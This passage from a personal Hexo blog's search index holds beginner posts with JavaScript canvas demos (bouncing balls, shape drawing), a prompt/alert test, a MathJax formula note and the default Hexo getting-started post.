      <url>/blog/js-addball/</url>
      
        <content type="html"><![CDATA[<p><canvas id="cnv1" width="400" height="400"></canvas></p><script src="https://code.jquery.com/jquery-2.0.1.js"></script><script type="text/javascript">    //canvas    var cnv = document.getElementById("cnv1");    var ctx = cnv.getContext("2d");</script><script type="text/javascript">    //define ball    var ball = {        x : [],        y : [],        xSpeed : [],        ySpeed : []    };    ball.add = function(a=Math.random()*400,b=Math.random()*400) {        this.x.push(a);        this.y.push(b);        this.xSpeed.push(Math.random()*3);        this.ySpeed.push(Math.random()*3);    };    ball.draw = function() {        for(var i=0;i<this.x.length;i++) {            ctx.beginPath();            ctx.arc(this.x[i],this.y[i],5,0,2*Math.PI,false);            ctx.fill();        }    };    ball.move = function() {        for(var i=0;i<this.x.length;i++) {            this.x[i] += this.xSpeed[i];            this.y[i] += this.ySpeed[i];            if(this.x[i]<0) {                this.x[i] = -this.x[i];                this.xSpeed[i] = -this.xSpeed[i];            }            if(this.x[i]>400) {                this.x[i] = 400-this.x[i]%400;                this.xSpeed[i] = -this.xSpeed[i];            }            if(this.y[i]<0) {                this.y[i] = -this.y[i];                this.ySpeed[i] = -this.ySpeed[i];            }            if(this.y[i]>400) {                this.y[i] = 400-this.y[i]%400;                this.ySpeed[i] = -this.ySpeed[i];            }        }    };</script><script type="text/javascript">    //deal interact    $("#cnv1").click(function(event) {        ball.add(event.offsetX,event.offsetY);        ball.draw();    });    setInterval(function() {        ctx.clearRect(0,0,400,400);        ctx.strokeRect(0,0,400,400);        ball.move();        ball.draw();    },1)</script>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> canvas </tag>
            
            <tag> game </tag>
            
            <tag> jquery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScriptPainting</title>
      <link href="/blog/js-JavaScriptPainting/"/>
      <url>/blog/js-JavaScriptPainting/</url>
      
        <content type="html"><![CDATA[<p>Now,let’s start painting!<br>Ususally,the numbers are starting from 0, what will happen if you press 0? Have a try.</p><canvas id="cvs1" width="400" height="400"></canvas><script type="text/javascript">    var cvs = document.getElementById("cvs1");    var ctx = cvs.getContext("2d");    var mg3 = prompt("What do you want to draw? Enter 1 to draw a rectangle;2 to draw a strokerectangle;3 to draw a triangle;4 to draw a cross;5 to draw two circles;6 to draw a Gomokuboard;7 to draw a Chessboard;...to be continue...");    if(mg3 === "0") {        ctx.fillStyle = "#000000";        ctx.strokeStyle = "#000000";        ctx.lineWidth = 4;        //draw a circle        ctx.beginPath();        ctx.arc(200,200,190,0,2*Math.PI,false);         ctx.stroke();        //draw the smile        ctx.beginPath();        ctx.arc(200,200,160,(0.1)*Math.PI,(0.9)*Math.PI,false);        ctx.stroke();        //left eye        ctx.beginPath();        ctx.arc(100,400,250,(1.42)*Math.PI,(1.58)*Math.PI,false);        ctx.stroke();        ctx.beginPath();        ctx.arc(100,420,250,(1.42)*Math.PI,(1.58)*Math.PI,false);        ctx.stroke();        ctx.beginPath();        ctx.arc(100-250*Math.sin(0.08*Math.PI),400+10-250*Math.cos(0.08*Math.PI),10,0,2*Math.PI,false);        ctx.fill();        ctx.beginPath();        ctx.arc(100+250*Math.sin(0.08*Math.PI),400+10-250*Math.cos(0.08*Math.PI),10,-0.5*Math.PI,0.5*Math.PI,false);        ctx.stroke();        //right eye        ctx.beginPath();        ctx.arc(300,400,250,(1.42)*Math.PI,(1.58)*Math.PI,false);        ctx.stroke();        ctx.beginPath();        ctx.arc(300,420,250,(1.42)*Math.PI,(1.58)*Math.PI,false);        ctx.stroke();        ctx.beginPath();        ctx.arc(300-250*Math.sin(0.08*Math.PI),400+10-250*Math.cos(0.08*Math.PI),10,0,2*Math.PI,false);        ctx.fill();        ctx.beginPath();        ctx.arc(300+250*Math.sin(0.08*Math.PI),400+10-250*Math.cos(0.08*Math.PI),10,-0.5*Math.PI,0.5*Math.PI,false);        ctx.stroke();    } else if(mg3 === "1") {        ctx.fillStyle = "#FF0000"        ctx.fillRect(100,100,100,100);    } else if(mg3 === "2") {        ctx.strokeStyle = "#FF0000"        ctx.strokeRect(100,100,100,100);    } else if(mg3 === "3") {        ctx.fillStyle = "Blue";        ctx.beginPath();        ctx.moveTo(50,50);        ctx.lineTo(350,50);        ctx.lineTo(200,300);        ctx.fill();    } else if(mg3 === "4") {        ctx.strokeStyle = "#FF0000";        ctx.beginPath();        ctx.moveTo(50,50);        ctx.lineTo(150,150);        ctx.moveTo(50,150);        ctx.lineTo(150,50);        ctx.stroke();    } else if(mg3 === "5") {        ctx.skrokeStyle = "#FF0000";        ctx.fillStyle = "#FF0000";        ctx.beginPath();        ctx.arc(50,50,30,0,Math.PI*2,false);        ctx.stroke();        ctx.beginPath();        ctx.arc(150,50,30,0,Math.PI*2,false);        ctx.fill();    } else if(mg3 === "6") {        ctx.fillStyle = "#000000";        ctx.strokeStyle = "#000000";        ctx.lineWidth = 1;        for(var i=0;i<20;i++) {            for(var j=0;j<20;j++) {                ctx.strokeRect(j*20,i*20,20,20);            }        }    } else if(mg3 === "7") {        ctx.fillStyle = "#000000";        ctx.strokeStyle = "#000000";        for(var i=0;i<8;i++) {            for(var j=0;j<8;j++) {                if((i+j)%2 == 0) {                    ctx.fillRect(j*50,i*50,50,50);                } else {                    ctx.strokeRect(j*50,i*50,50,50);                }            }        }    }</script>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20181114</title>
      <link href="/blog/20181114/"/>
      <url>/blog/20181114/</url>
      
        <content type="html"><![CDATA[<p>JavaScriptTest</p><script type="text/javascript">    var mg1 = prompt("Enter Your Name:");    var mg2 = confirm("Are You " + mg1.toString());    if(mg2) {        alert("Hello " + mg1.toString());    } else {        alert("You are just fucking kiding me!");    }</script>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20181113</title>
      <link href="/blog/20181113/"/>
      <url>/blog/20181113/</url>
      
        <content type="html"><![CDATA[<p>我终于装好了MathJax！！！！！！！！！！</p><p>曲率</p><p>$ K=\frac {|y’’|} {(1+y’^2)^{\frac {3}{2}}}  $s</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> mathjax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HelloWorld</title>
      <link href="/blog/test-HelloWorld/"/>
      <url>/blog/test-HelloWorld/</url>
      
        <content type="html"><![CDATA[<p>This is my first blog page.<br>And I just for test.</p><p>[toc]</p><h1 id="Markdown-Test"><a href="#Markdown-Test" class="headerlink" title="Markdown Test"></a>Markdown Test</h1><h1 id="H1"><a href="#H1" class="headerlink" title="H1"></a>H1</h1><h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><h3 id="H3"><a href="#H3" class="headerlink" title="H3"></a>H3</h3><h4 id="H4"><a href="#H4" class="headerlink" title="H4"></a>H4</h4><h1 id="CodeTest"><a href="#CodeTest" class="headerlink" title="CodeTest"></a>CodeTest</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> namespce <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"HelloWorld"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>???<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"2.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span>&gt;</span>qwq<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div2"</span>&gt;</span>QAQ<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">time</span> <span class="attr">pubdate</span>&gt;</span>2018-10-15 23:23<span class="tag">&lt;/<span class="name">time</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="MathJaxTest"><a href="#MathJaxTest" class="headerlink" title="MathJaxTest"></a>MathJaxTest</h1><p>$ \sqrt {256} $</p><script type="math/tex; mode=display">\begin{eqnarray}\nabla\cdot\vec{E} &=& \frac{\rho}{\epsilon_0} \\\nabla\cdot\vec{B} &=& 0 \\\nabla\times\vec{E} &=& -\frac{\partial B}{\partial t} \\\nabla\times\vec{B} &=& \mu_0\left(\vec{J}+\epsilon_0\frac{\partial E}{\partial t} \right)\end{eqnarray}</script>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HelloWorld</title>
      <link href="/blog/test-hello-world/"/>
      <url>/blog/test-hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
